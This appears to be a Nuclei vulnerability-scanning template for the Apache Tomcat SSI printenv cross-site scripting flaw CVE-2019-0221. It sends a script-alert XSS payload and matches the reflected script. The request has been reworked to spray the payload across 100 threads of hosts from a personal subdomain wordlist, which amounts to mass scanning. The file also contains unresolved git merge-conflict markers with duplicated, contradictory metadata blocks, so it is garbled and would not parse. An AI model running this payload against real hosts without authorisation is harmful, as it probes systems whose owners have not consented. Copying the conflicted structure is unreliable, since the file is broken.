id: CVE-2019-0221

info:
  name: Apache Tomcat - Cross-Site Scripting
  author: pikpikcu
<<<<<<< HEAD
  severity: medium
  description: |
<<<<<<< HEAD
    The SSI printenv command in Apache Tomcat 9.0.0.M1 to 9.0.0.17, 8.5.0 to 8.5.39 and
    7.0.0 to 7.0.93 echoes user provided data without escaping and is,
    therefore, vulnerable to XSS. SSI is disabled by default.
    The printenv command is intended for debugging and is unlikely to be present in a production website.
=======
    Apache Tomcat 9.0.0.M1 to 9.0.0.17, 8.5.0 to 8.5.39, and 7.0.0 to 7.0.93 are vulnerable to cross-site scripting because the SSI printenv command echoes user provided data without escaping. Note: SSI is disabled by default. The printenv command is intended for debugging and is unlikely to be present in a production website.
>>>>>>> 5d36d276 (add new stuff)
  reference:
    - https://seclists.org/fulldisclosure/2019/May/50
    - https://wwws.nightwatchcybersecurity.com/2019/05/27/xss-in-ssi-printenv-command-apache-tomcat-cve-2019-0221/
    - https://www.exploit-db.com/exploits/50119
    - https://lists.apache.org/thread.html/6e6e9eacf7b28fd63d249711e9d3ccd4e0a83f556e324aee37be5a8c@%3Cannounce.tomcat.apache.org%3E
<<<<<<< HEAD
=======
    - https://nvd.nist.gov/vuln/detail/CVE-2019-0221
>>>>>>> 5d36d276 (add new stuff)
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2019-0221
    cwe-id: CWE-79
<<<<<<< HEAD
  tags: cve,cve2019,apache,xss,tomcat
=======
  metadata:
    shodan-query: title:"Apache Tomcat"
  tags: apache,xss,tomcat,seclists,edb,cve,cve2019
>>>>>>> 5d36d276 (add new stuff)
=======
  severity: low
  reference: |
    - https://seclists.org/fulldisclosure/2019/May/50
    - https://wwws.nightwatchcybersecurity.com/2019/05/27/xss-in-ssi-printenv-command-apache-tomcat-cve-2019-0221/
  description: |
      The SSI printenv command in Apache Tomcat 9.0.0.M1 to 9.0.0.17, 8.5.0 to 8.5.39 and
      7.0.0 to 7.0.93 echoes user provided data without escaping and is,
      therefore, vulnerable to XSS. SSI is disabled by default.
      The printenv command is intended for debugging and is unlikely to be present in a production website.
  tags: cve,cve2019,apache,xss
>>>>>>> 18ddf72b (add new stuff)

requests:
  - payloads:
      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
    attack: sniper
    threads: 100

    raw:
      - |
        GET /printenv.shtml?%3Cscript%3Ealert(%27xss%27)%3C/script%3E HTTP/1.1
        Host: {{Subdomains}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0        
    matchers-condition: and
    matchers:

      - type: word
        words:
          - "<script>alert('xss')</script>"

      - type: word
        words:
          - "text/html"
        part: header

      - type: status
        status:
          - 200

# Enhanced by mp on 2022/08/11
